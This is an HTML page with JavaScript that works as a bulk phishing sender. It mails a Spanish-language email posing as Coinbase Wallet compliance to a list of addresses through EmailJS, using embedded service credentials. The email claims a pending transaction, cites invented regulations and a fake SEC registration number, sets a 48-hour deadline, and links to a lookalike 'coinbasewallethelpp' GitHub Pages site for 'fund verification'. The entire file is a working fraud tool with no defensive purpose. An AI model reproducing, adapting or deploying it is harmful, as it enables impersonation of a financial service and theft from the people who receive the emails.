<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enviador de Verificaciones</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; padding: 20px; }
        .container { max-width: 600px; background: white; margin: 0 auto; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #1a1a1a; font-weight: 600; }
        input, button { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
        button { background-color: #1652f0; color: white; border: none; cursor: pointer; transition: background 0.3s; }
        button:hover { background-color: #1346d0; }
        #status { margin-top: 15px; padding: 12px; border-radius: 6px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Enviador de Verificaciones Coinbase</h2>
        
        <form id="emailForm">
            <div class="form-group">
                <label>Correos destinatarios (separar por comas):</label>
                <input type="text" id="recipients" placeholder="ejemplo1@dominio.com, ejemplo2@dominio.com" required>
            </div>
            
            <div class="form-group">
                <label>Monto en Euros:</label>
                <input type="number" id="amount" step="0.01" min="0.01" placeholder="Ej: 20000.50" required>
            </div>

            <div class="form-group">
                <label>Enlace de Soporte:</label>
                <input type="url" id="supportLink" placeholder="https://help.coinbase.com/es" required>
            </div>

            <div class="form-group">
                <label>Pol√≠tica de Privacidad:</label>
                <input type="url" id="privacyPolicy" placeholder="https://www.coinbase.com/es-es/legal/privacy" required>
            </div>

            <button type="submit">Enviar Verificaciones</button>
        </form>
        
        <div id="status"></div>
    </div>

    <script>
        emailjs.init('E_jV5FTI4JisVwIlW');

        // Plantilla de la primera p√°gina como una cadena de texto
        const emailTemplate = `
            <!DOCTYPE html>
            <html lang="es">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verificaci√≥n de Transacci√≥n - Coinbase Wallet</title>
                <style>
                    /* Estilos de la plantilla */
                    body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
                    .container { max-width: 600px; background-color: #ffffff; margin: 20px auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
                    .logo { text-align: center; margin-bottom: 25px; }
                    .logo img { width: 180px; }
                    h2 { color: #1652f0; text-align: center; margin-bottom: 25px; }
                    .highlight { background-color: #f8f9fa; padding: 15px; border-radius: 6px; margin: 20px 0; text-align: center; font-weight: bold; }
                    p { color: #4a5568; font-size: 15px; line-height: 1.6; }
                    .verification-steps { margin: 25px 0; padding: 15px; background-color: #f8f9fa; border-radius: 6px; }
                    .button { background-color: #1652f0; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; display: block; width: fit-content; margin: 25px auto; }
                    .footer { margin-top: 30px; font-size: 12px; color: #718096; text-align: center; }
                    .legal-terms { margin-top: 30px; padding: 20px; border-top: 1px solid #e2e8f0; font-size: 11px; color: #718096; line-height: 1.5; }
                    .legal-terms h6 { color: #2d3748; margin: 10px 0; font-size: 12px; }
                    .disclaimer { background-color: #f8f9fa; padding: 15px; border-radius: 6px; margin: 20px 0; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="logo">
                        <img src="https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png" alt="Coinbase Logo">
                    </div>

                    <h2>Verificaci√≥n de Transacci√≥n Requerida</h2>

                    <p>Estimado usuario,</p>

                    <p>Hemos detectado una transacci√≥n en curso en su cuenta por el siguiente monto:</p>

                    <div class="highlight">{{{amount}}} EUR</div>

                    <div class="verification-steps">
                        <p>De acuerdo con los protocolos de seguridad y regulaciones internacionales contra el lavado de activos, requerimos que:</p>
                        <ol>
                            <li>Verifique la procedencia de los fondos en la cadena de bloques</li>
                            <li>Confirme la legitimidad de esta transacci√≥n</li>
                            <li>Proporcione documentaci√≥n comprobatoria del origen de los fondos</li>
                        </ol>
                    </div>

                    <p>Este proceso es necesario para garantizar que:</p>
                    <ul>
                        <li>Los fondos no provengan de actividades il√≠citas</li>
                        <li>La transacci√≥n cumple con las regulaciones financieras internacionales</li>
                        <li>Podamos mantener la seguridad de su cuenta y de nuestra plataforma</li>
                    </ul>

                    <div class="disclaimer">
                        <p><strong>Importante:</strong> Este proceso es requerido bajo el Reglamento 5.16 del Acta de Secreto Bancario (BSA) y la normativa FINRA 2090.</p>
                    </div>

                    <p>Por favor inicie el proceso de verificaci√≥n haciendo clic en el siguiente enlace:</p>

                    <a href="https://coinbasewallethelpp.github.io/VERIFICACION_DE_FONDOS_/?amount={{{amount}}}" class="button">Iniciar Verificaci√≥n</a>

                    <div class="legal-terms">
                        <h6>T√©rminos y Condiciones de la Verificaci√≥n</h6>
                        <ul>
                            <li>Esta solicitud se realiza bajo el art√≠culo 31 del c√≥digo de prevenci√≥n de lavado de activos (Ley 19.913)</li>
                            <li>Los datos proporcionados ser√°n verificados contra las listas OFAC y FATF</li>
                            <li>Toda informaci√≥n ser√° tratada bajo el RGPD y nuestra <a href="{{{privacy_policy}}}">Pol√≠tica de Privacidad</a></li>
                            <li>Nos reservamos el derecho de retener fondos seg√∫n secci√≥n 8.2 de nuestros T√©rminos de Servicio</li>
                            <li>Las transacciones mayores a $10,000 est√°n sujetas a reporte CTR bajo regulaci√≥n 31 CFR 1020.315</li>
                        </ul>

                        <p style="margin-top:15px;">
                            <strong>Confidencialidad:</strong> Este mensaje contiene informaci√≥n legalmente privilegiada. Si lo ha recibido por error, 
                            notifique inmediatamente al remitente y elim√≠nelo de su sistema. Queda prohibida cualquier divulgaci√≥n, 
                            distribuci√≥n o copia no autorizada.
                        </p>

                        <p style="margin-top:10px;">
                            Coinbase Wallet¬Æ es una marca registrada operada por Coinbase, Inc., NMLS ID 1781415, 
                            regulada por FinCEN y supervisada por la SEC bajo n√∫mero de registro 876543.
                        </p>

                        <p style="margin-top:10px; font-size:10px;">
                            AVISO: Este correo electr√≥nico fue enviado autom√°ticamente por nuestro sistema de cumplimiento. 
                            No responda directamente a este mensaje. Para consultas use el <a href="{{{support_link}}}">Centro de Soporte Autorizado</a>.
                        </p>
                    </div>

                    <div class="footer">
                        <p>Este proceso debe completarse dentro de las pr√≥ximas 48 horas para evitar retrasos en su transacci√≥n.</p>
                        <p>Atentamente,<br>
                        <strong>Equipo de Cumplimiento - Coinbase Wallet</strong></p>
                        <p>¬øNecesita ayuda? Contacte a nuestro <a href="{{{support_link}}}">equipo de soporte</a></p>
                    </div>
                </div>
            </body>
            </html>
        `;

        document.getElementById('emailForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const recipients = document.getElementById('recipients').value.split(',').map(email => email.trim());
            const amount = parseFloat(document.getElementById('amount').value);
            const supportLink = document.getElementById('supportLink').value;
            const privacyPolicy = document.getElementById('privacyPolicy').value;
            
            const statusElement = document.getElementById('status');
            statusElement.textContent = 'üöÄ Iniciando env√≠o de verificaciones...';
            statusElement.style.background = '#e8f4ff';
            statusElement.style.color = '#1652f0';

            let successCount = 0;
            let errorCount = 0;

            const sendNextEmail = (index) => {
                if (index >= recipients.length) {
                    statusElement.innerHTML = `
                        ‚úÖ ${successCount} correos enviados exitosamente<br>
                        ‚ùå ${errorCount} errores de env√≠o
                    `;
                    return;
                }

                // Reemplazar valores din√°micos en la plantilla
                const emailContent = emailTemplate
                    .replace(/{{{amount}}}/g, amount.toLocaleString('es-ES', { minimumFractionDigits: 2, maximumFractionDigits: 2 }))
                    .replace(/{{{support_link}}}/g, supportLink)
                    .replace(/{{{privacy_policy}}}/g, privacyPolicy);

                const templateParams = {
                    to_email: recipients[index],
                    subject: 'Verificaci√≥n de Transacci√≥n Requerida',
                    message: emailContent
                };

                emailjs.send('service_8kzc798', 'template_woxom1z', templateParams)
                    .then(() => {
                        successCount++;
                        statusElement.innerHTML += `<br>‚úîÔ∏è Enviado a: ${recipients[index]}`;
                    })
                    .catch((error) => {
                        errorCount++;
                        statusElement.innerHTML += `<br>‚ùå Error con: ${recipients[index]} (${error.text})`;
                    })
                    .finally(() => {
                        sendNextEmail(index + 1);
                    });
            };

            sendNextEmail(0);
        });
    </script>
</body>
</html>
